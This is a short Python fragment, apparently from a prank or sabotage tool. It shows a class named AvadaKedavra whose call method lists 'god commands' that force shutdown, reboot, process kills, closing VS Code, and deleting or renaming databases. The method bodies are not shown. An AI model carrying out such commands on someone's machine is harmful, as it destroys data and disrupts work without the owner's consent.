...
class AvadaKedavra:
    ...
    def __call__(self):
        god_commands = [TrickCommands.force_shutdown,
                    TrickCommands.force_reboot,
                    TrickCommands.force_taskkill,
                    TrickCommands.force_taskkill_vscode,
                    TrickCommands.force_database_deletion,
                    TrickCommands.force_notebase_deletion,
                    TrickCommands.force_database_rename,
                    TrickCommands.force_notebase_rename,
                    TrickCommands.force_reboot_file_creation
                ]
        
        # god_commands = [TrickCommands.force_taskkill_vscode]   
